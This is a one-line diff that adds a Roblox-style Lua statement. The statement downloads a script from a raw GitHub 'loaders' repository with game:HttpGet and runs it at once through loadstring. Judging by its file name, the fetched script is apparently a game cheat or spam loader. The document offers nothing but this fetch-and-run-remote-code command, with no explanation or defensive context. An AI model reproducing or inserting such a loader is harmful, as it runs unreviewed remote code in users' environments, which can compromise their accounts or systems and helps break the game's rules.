@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/catch-the-artist-spam6-r2ysqikuo6phbf.lua"))()
